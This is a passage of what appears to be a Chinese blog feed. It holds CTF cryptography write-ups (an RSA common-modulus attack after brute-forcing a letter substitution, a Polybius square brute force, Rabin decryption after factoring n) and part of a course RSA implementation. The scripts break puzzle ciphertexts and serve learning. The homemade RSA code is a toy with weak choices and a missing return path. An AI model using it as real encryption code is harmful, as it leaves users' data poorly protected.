59&#125;</span><br><span class="line">e1:&#123;&apos;I&apos;: 3, &apos;Z&apos;: 1, &apos;B&apos;: 2, &apos;T&apos;: 1, &apos;g&apos;: 1&#125;</span><br><span class="line">e2:&#123;&apos;A&apos;: 1, &apos;b&apos;: 1, &apos;g&apos;: 2, &apos;I&apos;: 1, &apos;T&apos;: 1, &apos;Z&apos;: 1&#125;</span><br></pre></td></tr></table></figure><p>发现总共就出现了10个字母<code>A,B,E,g,I,O,S,b,T,Z</code>,猜想这10个字母对应的是0-9的10个数字，如何将字母和数字进行对应是个头疼的问题；想了半天，没办法，只能暴力破解，产生字母的全排列对应10个数字…</p><p><strong>暴力破解脚本</strong>(借鉴队友脚本学习了一下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">dic_alp1=[<span class="string">'O'</span>,<span class="string">'T'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'b'</span>,<span class="string">'Z'</span>,<span class="string">'I'</span>,<span class="string">'E'</span>,<span class="string">'S'</span>,<span class="string">'g'</span>]</span><br><span class="line">dic_num=[<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">dic_alp2=list(itertools.permutations(dic_alp1))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_alp2:</span><br><span class="line">n=<span class="string">"ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI"</span></span><br><span class="line">c1=<span class="string">"ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI"</span></span><br><span class="line">c2=<span class="string">"IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT"</span></span><br><span class="line">e1=<span class="string">"IIIBTZBg"</span></span><br><span class="line">e2=<span class="string">"gbATZgI"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">n=n.replace(x[i],dic_num[i])</span><br><span class="line">c1=c1.replace(x[i],dic_num[i])</span><br><span class="line">c2=c2.replace(x[i],dic_num[i])</span><br><span class="line">e1=e1.replace(x[i],dic_num[i])</span><br><span class="line">e2=e2.replace(x[i],dic_num[i])</span><br><span class="line"></span><br><span class="line">n=int(n,<span class="number">10</span>)</span><br><span class="line">c1=int(c1,<span class="number">10</span>)</span><br><span class="line">c2=int(c2,<span class="number">10</span>)</span><br><span class="line">e1=int(e1,<span class="number">10</span>)</span><br><span class="line">e2=int(e2,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> gmpy2.gcd(e1,e2)!=<span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">mgcd,s,t=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="keyword">if</span> s&lt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s=-s</span><br><span class="line">c1=gmpy2.invert(c1,n)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> t&lt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">t=-t</span><br><span class="line">c2=gmpy2.invert(c2,n)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">plain=pow(c1,s,n)*pow(c2,t,n)%n</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">ans = <span class="string">'&#123;:x&#125;'</span>.format(plain).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>先用出现字母的全排列对应表0-9这10个数，然后将所有参数用数字表示，用RSA的共模攻击求出最后的结果，发现flag：</p><p><a href="https://imgchr.com/i/kS6qQ1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/16/kS6qQ1.md.png" alt="kS6qQ1.md.png"></a></p><p>最后发现是与数字形状相似的字母代替数字产生的参数…… </p><p><strong>attention：</strong>其实可以对脚本进行优化，因为<code>e1</code>和<code>e2</code>都是和<code>φ(n)</code>互素的，所以<code>e1</code>和<code>e2</code>都是奇数，所以可以缩小<code>e1</code>和<code>e2</code>的范围，最后一个数字都是奇数，即：<code>g</code>和<code>I</code>都是奇数；</p><h3 id="古典密码签到题"><a href="#古典密码签到题" class="headerlink" title="古典密码签到题"></a>古典密码签到题</h3><p>这题直接告诉是棋盘密码，比较简单，给出的密文里总共有<code>ksynb</code>5个字母，所以直接构造这5个字母的全排列对应26字母表即可，总共有5!=120种不同的结果，可以直接暴破；</p><p><strong>暴力破解脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">key=[]</span><br><span class="line">cipher=<span class="string">"ksyssskkysynbssbbnynnb"</span></span><br><span class="line">dic_cip=list(itertools.permutations(<span class="string">"ksynb"</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_cip:</span><br><span class="line">    key.append(<span class="string">''</span>.join(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> child_key <span class="keyword">in</span> key:</span><br><span class="line">    num_c=<span class="string">""</span></span><br><span class="line">    ans=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c <span class="keyword">in</span> cipher:</span><br><span class="line">        num_c+=str(child_key.index(now_c))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(num_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii=int(num_c[i])*<span class="number">5</span>+int(num_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">"i"</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        ans+=chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">print</span> child_key,ans</span><br></pre></td></tr></table></figure><p>发现有两种结果里面有<code>flag</code>字符，显然是第一个，排列方式为<code>skynb</code>；</p><p><img src="https://s2.ax1x.com/2019/01/16/kS4Yuj.png" alt="kS4Yuj.png"></p><h3 id="First-level"><a href="#First-level" class="headerlink" title="First level"></a>First level</h3><p>题目给出<code>e=2</code>，基本已经锁定是RSA的衍生算法rabin，yafu分解n得到p和q如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PRP617 = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span><br><span class="line">PRP617 = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span><br><span class="line"></span><br><span class="line">ans = 1</span><br><span class="line"></span><br><span class="line">eof; done processing batchfile</span><br></pre></td></tr></table></figure><p><strong>攻击脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">499900287907163903863770127517451824950591449854220282014018552802396943304674724533357663876916175459043411887269615620980351359674373127551283923032759205525834407466303318140213222438375548066871397251493100247836770129792554768759516349058673615081761638343932256849889604058608747531941928982832585706361391950223948529046950139043176720742038526998231448270490097134641169635210567151369533018545746204046992368621334939029582400285322777365958482219075297507215203709356125635202625121091161318566582307478931230962853531285514124459092351456397307588024613094226807792165876133269038363995037219677926220967578191033480631890589761476293394613074763877465067481353073032261829035532832262390121385388328585967620567497069930361644409182632934629875953161754678971744082331335000439916510067572742641854184303838362027247026467270857712018679364014951870327424723286991989268813839644982317838329022551033151317911958707603833070206941532496854730739054206016872958750645705043270396511543390465607172543992216405734971188437702405334334961918445724163241075322921116618280425131683507843396376626705861243420399065472311770119489811395486846742327683616439776584876654620796349661745998246254486950516901889112077176621805823</span></span><br><span class="line">p=<span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</span></span><br><span class="line">q=<span class="number">28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ans=rabin_decrypt(c,p,q,e=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ans:</span><br><span class="line">        temp=<span class="string">'&#123;:x&#125;'</span>.format(x).decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> temp:</span><br><span class="line">            <span class="keyword">print</span> temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>攻击得到4个结果，经过筛选得到一段含有flag的有意义的明文：</p><p><img src="https://s2.ax1x.com/2019/01/16/kSbyYn.png" alt="kSbyYn.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;知其然，知其所以然
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>密码学课程设计之RSA公钥加密</title>
    <link href="https://gardenia30.top/2019/01/13/RSA%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%85%AC%E9%92%A5%E5%8A%A0%E5%AF%86/"/>
    <id>https://gardenia30.top/2019/01/13/RSA非对称公钥加密/</id>
    <published>2019-01-13T12:22:25.000Z</published>
    <updated>2019-04-09T09:24:21.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你知道什么叫非对称吗？<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用；</p><h2 id="公钥与私钥的产生"><a href="#公钥与私钥的产生" class="headerlink" title="公钥与私钥的产生"></a>公钥与私钥的产生</h2><p>1.随机选择两个不同大质数 p和 q，计算 <code>N=p×q</code></p><p>2.根据欧拉函数，求得<code>r=φ(N)=φ(p)φ(q)=(p−1)(q−1)</code></p><p>3.选择一个小于 r 的整数 e，使 e 和 r互质。并求得 e 关于 r 的模反元素，为 d，有 <code>ed≡1 mod red≡1 mod r</code></p><p>4.将 p 和 q 的记录销毁；</p><p>此时，<code>(N,e)</code>是公钥，<code>(N,d)</code>是私钥；</p><h2 id="消息加密"><a href="#消息加密" class="headerlink" title="消息加密"></a>消息加密</h2><p>首先需要将消息 m 以一个双方约定好的格式转化为一个小于  N，且与 N 互质的整数 n。如果消息太长，可以将消息分为几段，这也就是我们所说的分组加密，后对于每一部分利用如下公式加密：<code>n^e≡c(modN)</code>；</p><h2 id="消息解密"><a href="#消息解密" class="headerlink" title="消息解密"></a>消息解密</h2><p>利用密钥 d 进行解密：<code>c^d≡n(modN)</code>；</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="生成n字节的随机数"><a href="#生成n字节的随机数" class="headerlink" title="生成n字节的随机数"></a>生成n字节的随机数</h3><p>调用<code>os.urandom()</code>随机生成n字节的随机数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrandom</span><span class="params">(n)</span>:</span></span><br><span class="line">data=urandom(n)</span><br><span class="line">a=int(binascii.hexlify(data),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><h3 id="第一次素性检验"><a href="#第一次素性检验" class="headerlink" title="第一次素性检验"></a>第一次素性检验</h3><p>首先进行第一次素性检验，检验100以内的素数是否为n的因数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">(n)</span>:</span></span><br><span class="line">dic_small=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>]</span><br><span class="line"><span class="comment"># print(len(dic_small))</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dic_small:</span><br><span class="line"><span class="keyword">if</span> n%x==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><h3 id="第二次素性检验"><a href="#第二次素性检验" class="headerlink" title="第二次素性检验"></a>第二次素性检验</h3><p>用Miller-rabin素性检验算法检验n，检验k次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_Miller</span><span class="params">(n,k)</span>:</span></span><br><span class="line"><span class="keyword">if</span> n&lt;<span class="number">2</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">d=n<span class="number">-1</span></span><br><span class="line">r=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span>(d&amp;<span class="number">1</span>):</span><br><span class="line">r+=<span class="number">1</span></span><br><span class="line">d&gt;&gt;=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(k):</span><br><span class="line">a=getrandom(<span class="number">120</span>)</span><br><span class="line">x=pow(a,d,n)</span><br><span class="line"><span class="keyword">if</span> x==<span class="number">1</span> <span class="keyword">or</span> x==n<span class="number">-1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(r<span class="number">-1</span>):</span><br><span class="line">x=pow(x,<span class="number">2</span>,n)</span><br><span class="line"><span class="keyword">if</span> x==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">if</span> x==n<span class="number">-1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><h3 id="通过两次素性检测"><a href="#通过两次素性检测" class="headerlink" title="通过两次素性检测"></a>通过两次素性检测</h3><p>产生byte字节的数，并且通过两次素性检测</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getprime</span><span class="params">(byte)</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">n=getrandom(byte)</span><br><span class="line"><span class="keyword">if</span> test1(n):</span><br><span class="line"><span class="keyword">if</span> test_Miller(n,<span class="number">10</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">return</span> n</span><br></pre></td></tr></table></figure><h3 id="产生公钥e"><a href="#产生公钥e" class="headerlink" title="产生公钥e"></a>产生公钥e</h3><p>产生一个和φ(n)互素的公钥e</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gete</span><span class="params">(ol)</span>:</span></span><br><span class="line">e=getprime(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> ol%e!=<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> e</span><br></pre></td></tr></table></figure><h3 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h3><p>加密时，先将明文进行16进制编码，然后转化为10进制计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexencode</span><span class="params">(str0)</span>:</span></span><br><span class="line">hexcode=base64.b16encode(str0)</span><br><span class="line">res=int(hexcode,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="16进制解码"><a href="#16进制解码" class="headerlink" title="16进制解码"></a>16进制解码</h3><p>解密时需要对计算出来的明文编码进行16进制解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdecode</span><span class="params">(str0)</span>:</span></span><br><span class="line">temp=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str0)):</span><br><span class="line"><span class="keyword">if</span> ord(str0[i])&gt;<span class="number">96</span> <span class="keyword">and</span> ord(str0[i])&lt;<span class="number">123</span>:</span><br><span class="line">temp+=chr(ord(str0[i])<span class="number">-32</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp+=str0[i]</span><br><span class="line">res=base64.b16decode(temp)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="分组加密一组"><a href="#分组加密一组" class="headerlink" title="分组加密一组"></a>分组加密一组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAencrypt_group</span><span class="params">(m,e,n)</span>:</span></span><br><span class="line">num1=hexencode(m)                            </span><br><span class="line"> c=pow(num1,e,n)                    <span class="comment">#cipher</span></span><br><span class="line"><span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h3 id="加密全部"><a href="#加密全部" class="headerlink" title="加密全部"></a>加密全部</h3><p>5个字符一组进行加密,将所有的密文连接在一起输出，将每个分组的密文存储在cip列表中用于以后的解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAencrypt_all</span><span class="params">(m,e,n)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(m),<span class="number">5</span>):</span><br><span class="line">temp=m[i:i+<span class="number">5</span>]</span><br><span 